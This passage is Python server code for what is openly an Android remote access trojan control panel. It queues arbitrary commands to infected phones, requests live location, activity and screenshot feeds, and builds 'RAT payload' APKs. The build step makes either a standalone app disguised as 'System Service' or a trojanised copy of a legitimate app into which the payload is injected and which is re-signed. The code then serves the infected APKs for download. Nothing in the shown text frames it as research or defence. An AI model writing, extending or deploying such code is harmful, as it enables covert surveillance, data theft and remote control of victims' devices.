    logger.info(f"Client {request.sid} joined room {room}")
    
    # Send initial device-specific data
    if device_id in connected_devices:
        # Get comprehensive device info
        device_info = connected_devices[device_id].copy()
        device_info["device_id"] = device_id
        device_info["pending_commands"] = len(device_commands.get(device_id, []))
        
        # Get recent command history
        command_history = command_handler.get_command_results(device_id, limit=10)
        
        emit('device_details', {
            'device_info': device_info,
            'recent_commands': command_history
        })
    else:
        emit('error', {'message': 'Device not found'})

@socketio.on('leave_device_room')
def handle_leave_device_room(data):
    """Leave a device-specific room"""
    device_id = data.get('device_id')
    if not device_id:
        emit('error', {'message': 'Device ID required'})
        return
        
    # Remove client from device-specific room
    from flask_socketio import leave_room
    room = f"device_{device_id}"
    leave_room(room)
    logger.info(f"Client {request.sid} left room {room}")

@socketio.on('request_live_update')
def handle_request_live_update(data):
    """Set up continuous updates for a specific data type from a device"""
    device_id = data.get('device_id')
    update_type = data.get('type')  # 'location', 'status', 'activity'
    interval = data.get('interval', 30)  # seconds
    
    if not device_id or not update_type:
        emit('error', {'message': 'Device ID and update type required'})
        return
    
    if update_type not in ['location', 'status', 'activity', 'screenshot']:
        emit('error', {'message': 'Invalid update type'})
        return
    
    # Validate interval
    try:
        interval = int(interval)
        if interval < 5 or interval > 300:  # 5s to 5m
            emit('error', {'message': 'Interval must be between 5 and 300 seconds'})
            return
    except ValueError:
        emit('error', {'message': 'Invalid interval format'})
        return
    
    # Create live update command
    update_command = {
        "action": "start_live_update",
        "update_type": update_type,
        "interval": interval
    }
    
    # Queue the command
    if device_id not in device_commands:
        device_commands[device_id] = []
    
    command_id = secrets.token_hex(8)
    device_commands[device_id].append({
        "id": command_id,
        "command": json.dumps(update_command),
        "timestamp": time.time()
    })
    
    logger.info(f"Live {update_type} updates requested from device {device_id} every {interval}s")
    emit('update_requested', {
        'status': 'ok',
        'command_id': command_id,
        'update_type': update_type,
        'interval': interval
    })

@socketio.on('send_command')
def handle_send_command(data):
    """Handle command sent through WebSocket"""
    logger.info(f'Command received via WebSocket: {data}')
    
    try:
        device_id = data.get('device_id')
        command = data.get('command')
        
        if not device_id or not command:
            emit('error', {'message': 'Device ID and command required'})
            return
        
        # Create command queue for this device if it doesn't exist
        if device_id not in device_commands:
            device_commands[device_id] = []
            
        # Add command to queue
        command_id = secrets.token_hex(8)
        device_commands[device_id].append({
            "id": command_id,
            "command": command,
            "timestamp": time.time()
        })
        
        logger.info(f"Command queued for device {device_id}: {command}")
        emit('command_sent', {'status': 'ok', 'command_id': command_id})
        
    except Exception as e:
        logger.error(f"Error sending command via WebSocket: {str(e)}", exc_info=True)
        emit('error', {'message': f'Error: {str(e)}'})

@socketio.on('build_payload')
def handle_build_payload(data):
    """Handle payload build request through WebSocket"""
    build_type = data.get('type')
    config = data.get('config', {})
    
    logger.info(f"Payload build request received: {build_type}")
    
    # Build payload in a separate thread to not block the server
    build_thread = threading.Thread(target=process_build_request, args=(build_type, config, request.sid))
    build_thread.daemon = True
    build_thread.start()
    
    # Send initial response
    emit('build_progress', {
        'progress': 5,
        'message': f"Build request received, processing {build_type} payload..."
    })

def process_build_request(build_type, config, sid):
    """Process a payload build request in a separate thread"""
    try:
        # Parse build request
        socketio.emit('build_progress', {
            'progress': 10,
            'message': "Parsing build configuration..."
        }, to=sid)
        
        # Prepare build environment
        socketio.emit('build_progress', {
            'progress': 20,
            'message': "Preparing build environment..."
        }, to=sid)
        
        # Set up build parameters
        if build_type == 'standalone':
            app_name = config.get('appName', 'System Service')
            # Use a default C2 server URL if not provided in the config
            c2_server = config.get('c2Server', 'http://localhost:5000')
            app_icon = config.get('appIcon')  # Base64 encoded icon if provided
            
            socketio.emit('build_progress', {
                'progress': 30,
                'message': f"Building standalone APK: {app_name}..."
            }, to=sid)
            
            # Update progress to 40%
            socketio.emit('build_progress', {
                'progress': 40,
                'message': "Generating RAT payload code..."
            }, to=sid)
            
            # Update progress to 60%
            socketio.emit('build_progress', {
                'progress': 60,
                'message': "Building APK structure..."
            }, to=sid)
            
            # Build the standalone APK using the ApkBuilder
            build_result = apk_builder.build_standalone_apk(
                app_name=app_name,
                app_icon=app_icon,
                c2_server=c2_server
            )
            
            if build_result['status'] != 'success':
                socketio.emit('build_error', {
                    'message': build_result['message']
                }, to=sid)
                return
                
            # Update progress to 90%
            socketio.emit('build_progress', {
                'progress': 90,
                'message': "Finalizing APK..."
            }, to=sid)
            
            # Get output path and file size from the build result
            output_path = build_result['output_path']
            file_size = build_result['file_size']
            package_name = build_result['package_name']
            
            # Send completion message
            socketio.emit('build_complete', {
                'type': 'standalone',
                'appName': app_name,
                'packageName': package_name,
                'c2Server': c2_server,
                'outputPath': output_path,
                'fileSize': file_size
            }, to=sid)
            
        elif build_type == 'binding':
            # Handle APK binding
            has_legitimate_apk = 'legitimateApk' in config
            if not has_legitimate_apk:
                socketio.emit('build_error', {
                    'message': "Missing legitimate APK file"
                }, to=sid)
                return
                
            # Use a default C2 server URL if not provided in the config
            c2_server = config.get('c2Server', 'http://localhost:5000')
            preserve_functionality = config.get('preserveFunctionality', True)
            
            # Get info from legitimate APK
            legitimate_apk = config.get('legitimateApk', {})
            apk_name = legitimate_apk.get('name', 'unknown.apk')
            apk_path = legitimate_apk.get('path')
            apk_data = legitimate_apk.get('data')  # For base64 encoded APK data
            
            # Log info about the received APK
            apk_size = legitimate_apk.get('size', 0)  # For file size info
            
            # Process base64 encoded APK data if available
            if apk_data:
                try:
                    data_length = len(apk_data) if isinstance(apk_data, str) else 0
                    logger.info(f"Received APK: {apk_name}, data length: {data_length}, declared size: {apk_size}")
                    
                    # Send progress update
                    socketio.emit('build_progress', {
                        'progress': 15,
                        'message': f"Received APK: {apk_name} ({formatFileSize(apk_size) if apk_size else 'unknown size'})"
                    }, to=sid)
                    
                    logger.info(f"Processing base64 encoded APK data for: {apk_name}")
                    
                    # Create temp directory if it doesn't exist
                    if not os.path.exists(apk_builder.TEMP_DIR):
                        os.makedirs(apk_builder.TEMP_DIR)
                    
                    # Save the base64 APK data to a file
                    temp_apk_path = os.path.join(apk_builder.TEMP_DIR, apk_name)
                    
                    # Update progress
                    socketio.emit('build_progress', {
                        'progress': 20,
                        'message': f"Decoding APK data..."
                    }, to=sid)
                    
                    # Decode and write to file
                    # Handle different base64 formats (with/without headers)
                    if ',' in apk_data:
                        # This is likely a data URI (e.g., "data:application/octet-stream;base64,ACTUAL_DATA")
                        apk_data = apk_data.split(',', 1)[1]
                    
                    # Remove any whitespace or line breaks that might be in the base64 string
                    apk_data = apk_data.strip().replace('\n', '').replace('\r', '')
                    
                    # Decode the data
                    try:
                        apk_bytes = base64.b64decode(apk_data)
                        
                        # Validate the APK file header (check for ZIP or APK magic numbers)
                        if not (apk_bytes.startswith(b'PK\x03\x04') or apk_bytes.startswith(b'dex\n')):
                            socketio.emit('build_progress', {
                                'progress': 20,
                                'message': "Warning: File doesn't look like a valid APK, attempting to process anyway"
                            }, to=sid)
                        
                        with open(temp_apk_path, 'wb') as f:
                            f.write(apk_bytes)
                    except Exception as e:
                        logger.error(f"Error decoding base64 APK data: {str(e)}", exc_info=True)
                        raise Exception(f"Invalid base64 data: {str(e)}")
                    
                    # Verify file was saved correctly
                    if os.path.exists(temp_apk_path):
                        file_size = os.path.getsize(temp_apk_path)
                        logger.info(f"Saved APK to: {temp_apk_path}, size: {file_size} bytes")
                        
                        # Update progress
                        socketio.emit('build_progress', {
                            'progress': 25,
                            'message': f"APK saved successfully: {formatFileSize(file_size)}"
                        }, to=sid)
                        
                        apk_path = temp_apk_path
                    else:
                        logger.error(f"Failed to save APK to: {temp_apk_path}")
                        socketio.emit('build_error', {
                            'message': f"Failed to save uploaded APK"
                        }, to=sid)
                        return
                        
                except Exception as e:
                    logger.error(f"Error processing APK data: {str(e)}", exc_info=True)
                    socketio.emit('build_error', {
                        'message': f"Error processing APK: {str(e)}"
                    }, to=sid)
                    return
            
            # Check if we have an APK path after processing
            if not apk_path:
                # Use a template APK if we don't have a real one uploaded
                templates = apk_builder.list_available_templates()
                if templates:
                    # Use the first template
                    template_path = templates[0]['path']
                    temp_apk_path = os.path.join(apk_builder.TEMP_DIR, apk_name)
                    # Make a copy of the template
                    import shutil
                    shutil.copy(template_path, temp_apk_path)
                    socketio.emit('build_progress', {
                        'progress': 25,
                        'message': f"Using template APK: {os.path.basename(template_path)}"
                    }, to=sid)
                    apk_path = temp_apk_path
                else:
                    # Create a standalone APK instead
                    socketio.emit('build_progress', {
                        'progress': 25,
                        'message': "No template APK available, creating standalone APK instead..."
                    }, to=sid)
                    # We'll create a standalone APK instead
                    socketio.emit('build_progress', {
                        'progress': 30,
                        'message': "Creating standalone APK instead..."
                    }, to=sid)
                    
                    # Build standalone APK
                    standalone_app_name = "System Service"
                    standalone_c2_server = config.get('c2Server', 'http://localhost:5000')
                    
                    # Call the standalone build directly
                    build_result = apk_builder.build_standalone_apk(
                        app_name=standalone_app_name,
                        c2_server=standalone_c2_server
                    )
                    
                    if build_result['status'] != 'success':
                        socketio.emit('build_error', {
                            'message': build_result['message']
                        }, to=sid)
                        return
                        
                    # Update progress to 90%
                    socketio.emit('build_progress', {
                        'progress': 90,
                        'message': "Finalizing standalone APK..."
                    }, to=sid)
                    
                    # Get output path and file size from the build result
                    output_path = build_result['output_path']
                    file_size = build_result['file_size']
                    package_name = build_result['package_name']
                    
                    # Send completion message
                    socketio.emit('build_complete', {
                        'type': 'standalone',
                        'appName': standalone_app_name,
                        'packageName': package_name,
                        'c2Server': standalone_c2_server,
                        'outputPath': output_path,
                        'fileSize': file_size
                    }, to=sid)
                    
                    # Exit the function after completing the standalone build
                    return
            
            socketio.emit('build_progress', {
                'progress': 30,
                'message': f"Analyzing legitimate APK: {apk_name}..."
            }, to=sid)
            
            # Update progress to 40%
            socketio.emit('build_progress', {
                'progress': 40,
                'message': "Extracting APK components..."
            }, to=sid)
            
            # Update progress to 50%
            socketio.emit('build_progress', {
                'progress': 50,
                'message': "Injecting RAT payload..."
            }, to=sid)
            
            # Update progress to 70%
            socketio.emit('build_progress', {
                'progress': 70,
                'message': "Recompiling modified APK..."
            }, to=sid)
            
            # Bind the APK using the ApkBuilder
            build_result = apk_builder.bind_to_apk(
                apk_path=apk_path,
                preserve_functionality=preserve_functionality,
                custom_c2_server=c2_server
            )
            
            if build_result['status'] != 'success':
                socketio.emit('build_error', {
                    'message': build_result['message']
                }, to=sid)
                return
            
            # Update progress to 85%
            socketio.emit('build_progress', {
                'progress': 85,
                'message': "Signing infected APK..."
            }, to=sid)
            
            # Get output path and file size from the build result
            output_path = build_result['output_path']
            file_size = build_result['file_size']
            original_package = build_result.get('original_package', 'unknown')
            original_app_name = build_result.get('original_app_name', os.path.splitext(apk_name)[0].replace('_', ' ').title())
            
            socketio.emit('build_complete', {
                'type': 'binding',
                'originalApk': apk_name,
                'originalAppName': original_app_name,
                'originalPackage': original_package,
                'c2Server': c2_server,
                'preserveFunctionality': preserve_functionality,
                'outputPath': output_path,
                'fileSize': file_size
            }, to=sid)
        
        else:
            # Unknown build type
            socketio.emit('build_error', {
                'message': f"Unknown build type: {build_type}"
            }, to=sid)
    
    except Exception as e:
        logger.error(f"Error processing build request: {e}")
        socketio.emit('build_error', {
            'message': f"Build failed: {str(e)}"
        }, to=sid)

def formatFileSize(bytes):
    """Format file size in bytes to human-readable format"""
    if bytes is None or bytes == 0:
        return '0 Bytes'
    
    k = 1024
    sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB']
    i = int(math.floor(math.log(bytes, k)))
    
    # Handle case where bytes is too large
    if i >= len(sizes):
        i = len(sizes) - 1
    
    # Calculate the size with 2 decimal precision
    size = bytes / (k ** i)
    return f"{size:.2f} {sizes[i]}"

def get_build_step_message(progress):
    """Get a message for the current build step based on progress percentage"""
    if progress < 35:
        return "Setting up build configuration..."
    elif progress < 45:
        return "Generating RAT payload code..."
    elif progress < 55:
        return "Configuring app resources..."
    elif progress < 65:
        return "Compiling native components..."
    elif progress < 75:
        return "Building APK package..."
    elif progress < 85:
        return "Signing APK..."
    else:
        return "Finalizing and optimizing APK..."

# Function to broadcast command results to connected WebSocket clients
def broadcast_command_result(device_id, result):
    """Broadcast command result to all connected WebSocket clients"""
    socketio.emit('command_result', {
        'device_id': device_id,
        'result': result
    })

# API endpoint for downloading built APKs
@app.route('/api/download')
def download_file():
    """Endpoint to download built APK files"""
    try:
        # Get file path from query parameters - support both 'file' and 'path' params
        file_path = request.args.get('file') or request.args.get('path')
        
        # Security check: only allow downloads from the output_apks directory
        if not file_path:
            logger.warning("No file path provided for download")
            return jsonify({"status": "error", "message": "No file specified"}), 400
        
        # Handle different path formats
        if '..' in file_path:
            logger.warning(f"Path traversal attempt: {file_path}")
            return jsonify({"status": "error", "message": "Invalid file path"}), 400
        
        # Support various formats that might come from the client
        # 1. Full path with leading slash: /output_apks/file.apk
        # 2. Full path without leading slash: output_apks/file.apk
        # 3. Just filename: file.apk
        # 4. Path with backslashes (from Windows): output_apks\file.apk
        
        # Normalize path (replace backslashes with forward slashes)
        file_path = file_path.replace('\\', '/')
        
        # Strip the /output_apks/ prefix if present, as our client sends it that way
        if file_path.startswith('/output_apks/'):
            local_path = file_path[1:]  # Remove leading slash
        elif file_path.startswith('output_apks/'):
            local_path = file_path
        else:
            # If just a filename was provided
            local_path = os.path.join('output_apks', file_path)
        
        logger.info(f"Download requested for file: {local_path}")
        
        # Check if file exists
        if not os.path.exists(local_path):
            logger.warning(f"Download requested for non-existent file: {local_path}. Current directory: {os.getcwd()}")
            
            # Check if file exists in output_apks directory directly
            alternate_path = os.path.join('output_apks', os.path.basename(file_path))
            if os.path.exists(alternate_path):
                logger.info(f"Found file at alternate path: {alternate_path}")
                local_path = alternate_path
            else:
                # List files in output_apks directory to debug
                try:
                    output_apks_files = os.listdir('output_apks')
                    logger.info(f"Files in output_apks: {output_apks_files}")
                except Exception as e:
                    logger.error(f"Error listing files in output_apks: {e}")
                
                return jsonify({
                    "status": "error", 
                    "message": "File not found",
                    "requested_path": file_path
                }), 404
        
        # Get the filename part for the download
        filename = os.path.basename(local_path)
        
        logger.info(f"Serving file: {local_path} with filename: {filename}")
        
        # Serve the file as a download
        return send_from_directory(
            directory=os.path.dirname(local_path),
            path=filename,
            as_attachment=True,
            mimetype='application/vnd.android.package-archive'
        )
        
    except Exception as e:
        logger.error(f"Error in download_file: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error", 
            "message": f"Error processing download: {str(e)}"
        }), 500

# Function to broadcast device updates to connected WebSocket clients
def broadcast_device_update():
    """Broadcast updated device list to all connected WebSocket clients"""
    devices = []
    for device_id, data in connected_devices.items():
        device_info = {
            "device_id": device_id,
            "last_seen": data["last_seen"],
            "ip_address": data["ip_address"],
            "user_agent": data.get("user_agent", "Unknown"),
            "pending_commands": len(device_commands.get(device_id, []))
        }
        devices.append(device_info)
    
    socketio.emit('device_update', {'devices': devices})

# Run the server when script is executed directly
if __name__ == "__main__":
    # Get port from environment or use default (5000 for Replit)
    port = int(os.getenv("PORT", 5000))
    
    # Check if SSL certificates are available
    cert_file = os.getenv("SSL_CERT")
    key_file = os.getenv("SSL_KEY")
    
    # Use SSL if certificates are provided
    if cert_file and key_file and os.path.exists(cert_file) and os.path.exists(key_file):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_file, key_file)
        socketio.run(app, host="0.0.0.0", port=port, ssl_context=context, debug=False, 
                     use_reloader=False, log_output=True, allow_unsafe_werkzeug=True)
    else:
        logger.warning("SSL certificates not found, running in HTTP mode")
        socketio.run(app, host="0.0.0.0", port=port, debug=False, 
                     use_reloader=False, log_output=True, allow_unsafe_werkzeug=True)
